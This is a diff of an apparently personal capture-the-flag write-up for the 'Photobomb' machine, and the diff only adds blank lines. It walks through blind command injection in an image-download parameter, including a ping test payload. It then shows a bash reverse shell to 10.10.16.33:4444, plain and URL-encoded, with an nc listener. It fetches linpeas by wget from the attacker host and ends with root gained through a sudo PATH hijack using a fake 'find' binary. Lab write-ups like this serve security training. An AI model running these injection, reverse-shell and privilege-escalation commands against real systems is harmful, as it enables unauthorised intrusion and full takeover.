@@ -10,22 +10,27 @@ Going to the `Sources` section in the developer tools you can find hard-coded cr
 - After fuzzing the parameters i.e. `photo`, `filetype` and `dimensions` it can be determined that the `filetype` parameter is vulnerable to `command injection`.
 - After running an initial `ping -c 10` I wanted to confirm since it is technically `blind command injection` since we cannot see the output of the commands.
 - On host:
+
 ```bash
 sudo tcpdump -i tun0 icmp
 ```
 - Then send a `POST` request with the following `body` content.
+
 ```bash
 photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg;ping+-c+10+your_ip&dimensions=30x20
 ```
 - After confirmation and some additional trial an error, right before attempting to hop on another machine to utilize burp collaborator and it's functionality, I utilized the `Encode/Decode/Hash` functionality on `Zap` and encoded the following text:
+
 ```bash
 bash -c 'exec bash -i &>/dev/tcp/10.10.16.33/4444 <&1'
 ```
 - To:
+
 ```bash
 bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.16.33%2F4444+%3C%261%27
 ```
 - For some reason using the `brave` browser plug-in for `hack-tools` the url-encoding did not work. Anyways this successfully allowed for a reverse shell. Just make sure the proper `nc` listener is set up on the host machine via:
+
 ```bash
 rlwrap nc -lvnp 4444
 ```
@@ -41,6 +46,7 @@ rlwrap nc -lvnp 4444
 **turns off own terminal echo which gives access to tab autocompletes, the arrow keys, and Ctrl+C & foregrounds the shell**  
 `stty raw -echo; fg`
 - The current user will be `wizard` and you can immediately obtain the `user.txt` flag
+
 ```bash
 cd
 cat user.txt
@@ -50,6 +56,7 @@ cat user.txt
 
 - After initial enumeration:
 - We can see that `sudo -l` allows us to execute `/opt/cleanup.sh`
+
 ```bash
 sudo -l
 Matching Defaults entries for wizard on photobomb:
@@ -60,6 +67,7 @@ User wizard may run the following commands on photobomb:
     (root) SETENV: NOPASSWD: /opt/cleanup.sh
 ```
 - Here is what it does:
+
 ```bash
 cat cleanup.sh
 #!/bin/bash
@@ -78,16 +86,19 @@ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 ```
 
  Let's install `linpeas.sh` 
+
 ```bash
 cd /tmp
 ```
 - On host ensure you have `linpeas.sh` in the current directory
 - I have mine in `~/Downloads/temp`
+
 ```bash
 cd ~/Downloads/temp
 python3 -m http.server
 ```
 - On `wizard`
+
 ```bash
 wget http://your_ip:8000/linpeas.sh
 chmod 700 linpeas.sh
@@ -95,6 +106,7 @@ chmod 700 linpeas.sh
 ```
 
 - Notice the `crontab` file executing every `5` minutes on the hour:
+
 ```bash
 */5 * * * * sudo /opt/cleanup.sh
 ```
@@ -107,6 +119,7 @@ chmod 700 linpeas.sh
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20230116213652.png)
 
 - Here is a list of world-writable folders:
+
 ```bash
 find / -writable -type d 2>/dev/null
 
@@ -162,19 +175,23 @@ find / -writable -type d 2>/dev/null
 ```
 
 - `/tmp` will do just fine
+
 ```bash
 cd temp
 ```
 - Let's make the binary which will elevate our privlieges:
+
 ```bash
 echo "/bin/bash" > find
 chmod 777 find
 ```
 - Now run the following command pre-fixed with `sudo`:
+
 ```bash
 sudo PATH=/tmp:$PATH /opt/cleanup.sh
 ```
 - Voila!!! Root!
+
 ```bash
 cat /home/wizard/user.txt
 
